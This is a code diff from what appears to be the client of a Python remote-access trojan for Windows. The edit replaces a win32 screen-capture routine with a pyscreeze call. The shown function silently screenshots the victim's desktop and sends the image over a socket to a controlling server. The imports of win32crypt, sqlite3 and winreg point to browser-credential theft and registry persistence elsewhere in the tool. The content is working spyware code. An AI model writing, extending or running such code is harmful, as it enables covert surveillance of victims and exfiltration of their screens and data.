@@ -1,5 +1,5 @@
-import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3
-import win32console, win32gui, win32api, winerror, win32event, win32crypt, win32con, win32ui
+import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze
+import win32console, win32gui, win32api, winerror, win32event, win32crypt
 import urllib.request
 from shutil import copyfile
 from winreg import *
@@ -88,40 +88,12 @@ def info():
 
 
 def screenshot():
-    desktop_handle = win32gui.GetDesktopWindow()  # get a handle to the desktop
-    '''
-    arrScr[0] = width
-    arrScr[1] = height
-    arrScr[2] = left
-    arrScr[3] = top
-    '''
-    arrScr = [win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN),
-                            win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN),
-                            win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN),
-                            win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)]
-
-    desktop_device_context = win32gui.GetWindowDC(desktop_handle)
-    img_device_context = win32ui.CreateDCFromHandle(desktop_device_context)
-
-    memory_device_context = img_device_context.CreateCompatibleDC()
-
-    # create bitmap object to store screenshot
-    screenshot = win32ui.CreateBitmap()
-    screenshot.CreateCompatibleBitmap(img_device_context, arrScr[0], arrScr[1])
-    memory_device_context.SelectObject(screenshot)
-
-    # copy screen into memory device context
-    memory_device_context.BitBlt((0, 0), (arrScr[0], arrScr[1]), img_device_context, (arrScr[2], arrScr[3]), win32con.SRCCOPY)
-
-    # save screenshot and free objects
-    screenshot.SaveBitmapFile(memory_device_context, TMP + "/s.bmp")
-    memory_device_context.DeleteDC()
-    win32gui.DeleteObject(screenshot.GetHandle())
+    pyscreeze.screenshot(TMP + "/s.png")
 
     # send screenshot information to server
-    objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.bmp"))
+    objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
                               + " bytes" + "\n" + "Please wait..."))
-    objPic = open(TMP + "/s.bmp", "rb")  # send file contents and close the file
+    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
     time.sleep(1)
     objSocket.send(objPic.read())
     objPic.close()
